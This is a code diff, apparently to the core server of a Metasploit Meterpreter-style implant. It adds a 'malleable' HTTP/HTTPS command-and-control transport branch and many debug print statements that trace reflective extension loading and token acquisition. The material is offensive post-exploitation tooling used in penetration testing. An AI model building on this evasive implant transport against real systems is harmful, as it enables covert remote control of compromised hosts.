@@ -10,6 +10,9 @@
 #include "win/server_transport_named_pipe.h"
 #include "../../common/packet_encryption.h"
 
+// Timo
+#include "win/server_transport_winhttp_malleable.h"
+
 extern Command* extensionCommands;
 
 // include the Reflectiveloader() function
@@ -74,17 +77,42 @@ VOID load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExtensi
 {
 	while (stagelessExtensions->size > 0)
 	{
+		dprintf("[TIMOHELP] 40");
 		dprintf("[SERVER] Extension located at 0x%p: %u bytes", stagelessExtensions->dll, stagelessExtensions->size);
 		HMODULE hLibrary = LoadLibraryR(stagelessExtensions->dll, stagelessExtensions->size);
+		dprintf("[TIMOHELP] 41");
 		load_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
+		dprintf("[TIMOHELP] 42");
 		stagelessExtensions = (MetsrvExtension*)((LPBYTE)stagelessExtensions->dll + stagelessExtensions->size);
+		dprintf("[TIMOHELP] 43");
 	}
-
+	dprintf("[TIMOHELP] 44");
 	dprintf("[SERVER] All stageless extensions loaded");
-
+	dprintf("[TIMOHELP] 44.1 stagelessExtensions->size %x", stagelessExtensions->size);
+	dprintf("[TIMOHELP] 44.15 &stagelessExtensions->size %x", &stagelessExtensions->size);
+	dprintf("[TIMOHELP] 44.2 sizeof(stagelessExtensions->size %i", sizeof(stagelessExtensions->size));
 	// once we have reached the end, we may have extension initializers
 	LPBYTE initData = (LPBYTE)(&stagelessExtensions->size) + sizeof(stagelessExtensions->size);
-
+	dprintf("[TIMOHELP] 44.2 initdata: %x", initData);
+	dprintf("[TIMOHELP] 44.3 *initdata-9: %i", *(initData - 9));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData - 8));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData - 7));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData - 6));
+	dprintf("[TIMOHELP] 44.3 *initdata-5: %i", *(initData - 5));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData - 4));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData-3));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData-2));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData-1));
+	dprintf("[TIMOHELP] 44.3 *initdata0: %i", *(initData+0));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData+1));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData+2));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData + 3));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData + 4));
+	dprintf("[TIMOHELP] 44.3 *initdata5: %i", *(initData + 5));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData + 6));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData + 7));
+	dprintf("[TIMOHELP] 44.3 *initdata: %i", *(initData + 8));
+	dprintf("[TIMOHELP] 44.3 *initdata9: %i", *(initData + 9));
 	while (initData != NULL && *initData != '\0')
 	{
 		const char* extensionName = (const char*)initData;
@@ -94,7 +122,7 @@ VOID load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExtensi
 		stagelessinit_extension(extensionName, data, dataSize);
 		initData = data + dataSize;
 	}
-
+	dprintf("[TIMOHELP] 45");
 	dprintf("[SERVER] All stageless extensions initialised");
 }
 
@@ -114,14 +142,23 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 	{
 		transport = transport_create_named_pipe((MetsrvTransportNamedPipe*)transportCommon, size);
 	}
+	else if (wcsncmp(transportCommon->url, L"httpm", 5) == 0 || wcsncmp(transportCommon->url, L"httpsm", 6) == 0) // TIMO
+	{
+		dprintf("[TIMOHELP] 19.8");
+		//memmove(transportCommon->url, transport->url++, strlen(transport->url));
+		dprintf("[TIMOHELP] 19.9");
+		transport = transport_create_http_malleable((MetsrvTransportHttp*)transportCommon, size);
+	}
 	else
 	{
 		transport = transport_create_http((MetsrvTransportHttp*)transportCommon, size);
+		dprintf("[TIMOHELP] 20");
 	}
 
 	if (transport == NULL)
 	{
 		// something went wrong
+		dprintf("[TRNS] Transport == NULL something went wrong...");
 		return NULL;
 	}
 
@@ -140,7 +177,7 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 		remote->transport->prev_transport->next_transport = transport;
 		remote->transport->prev_transport = transport;
 	}
-
+	dprintf("[TIMOHELP] 21");
 	return transport;
 }
 
@@ -195,6 +232,7 @@ static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports,
 	while (current->url[0] != 0)
 	{
 		DWORD size;
+		dprintf("[TIMOHELP] 30");
 		if (create_transport(remote, current, &size) != NULL)
 		{
 			dprintf("[TRANS] transport created of size %u", size);
@@ -208,11 +246,12 @@ static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports,
 			// This is not good
 			return FALSE;
 		}
+		
 	}
 
 	// account for the last terminating NULL wchar
 	*parsedSize = totalSize + sizeof(wchar_t);
-
+	dprintf("[TIMOHELP] 31");
 	return TRUE;
 }
 
@@ -355,19 +394,21 @@ DWORD server_setup(MetsrvConfig* config)
 			dprintf("[DISPATCH] Session going for %u seconds from %u to %u", remote->sess_expiry_time, remote->sess_start_time, remote->sess_expiry_end);
 
 			DWORD transportSize = 0;
+			dprintf("[TIMOHELP] 59");
 			if (!create_transports(remote, config->transports, &transportSize))
 			{
+				dprintf("[TIMOHELP] 60 Not good!");
 				// not good, bail out!
 				SetLastError(ERROR_BAD_ARGUMENTS);
 				break;
 			}
-
+			dprintf("[TIMOHELP] 61");
 			dprintf("[DISPATCH] Transport handle is %p", (LPVOID)config->session.comms_handle.handle);
 			if (remote->transport->set_handle)
 			{
 				remote->transport->set_handle(remote->transport, config->session.comms_handle.handle);
 			}
-
+			dprintf("[TIMOHELP] 62");
 			// Set up the transport creation function pointer
 			remote->trans_create = create_transport;
 			// Set up the transport removal function pointer
@@ -380,22 +421,24 @@ DWORD server_setup(MetsrvConfig* config)
 
 			dprintf("[SERVER] Registering dispatch routines...");
 			register_dispatch_routines();
-
+			dprintf("[TIMOHELP] 63");
 			// this has to be done after dispatch routine are registered
 			load_stageless_extensions(remote, (MetsrvExtension*)((LPBYTE)config->transports + transportSize));
-
+			dprintf("[TIMOHELP] 63.5");
 			// Store our process token
 			if (!OpenThreadToken(remote->server_thread, TOKEN_ALL_ACCESS, TRUE, &remote->server_token))
 			{
 				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &remote->server_token);
+				dprintf("[TIMOHELP] 63.6");
 			}
 
 			if (scheduler_initialize(remote) != ERROR_SUCCESS)
 			{
+				dprintf("[TIMOHELP] 63.7");
 				SetLastError(ERROR_BAD_ENVIRONMENT);
 				break;
 			}
-
+			dprintf("[TIMOHELP] 64");
 			// Copy it to the thread token
 			remote->thread_token = remote->server_token;
 
